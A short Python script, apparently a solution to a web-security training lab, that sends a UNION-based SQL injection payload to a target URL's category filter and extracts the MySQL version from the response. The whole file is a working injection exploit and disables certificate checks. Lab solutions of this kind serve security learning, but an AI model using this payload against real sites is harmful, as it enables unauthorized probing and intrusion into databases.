import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
    path = "/filter?category=Lifestyle"
    sqli_payload = "' UNION SELECT @@version, NULL%23"
    res = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    # find the string that is returned by the Regex pattern and extract the results to a variable, if it exists
    version = soup.find(string=re.compile(".*\d{1,2}\.\d{1,2}\.\d{1,2}.*")) 
    # Regex explanation: any num of characters, 1-2 digits, . character, 1-2 digits, . character, 1-2 digits, any num of characters
    # TIP: You can go to regex101.com to check if your Regex is correct or not
    if version:
        print("[+] Found the MySQL Database Version!")
        print("[+] The MySQL database version is: " + version)
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        # assume we know the # of columns and which columns we can use to output content from the DB
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s "<url>"' % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        exit()
    
    print("[+] Dumping the version of the database...")

    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")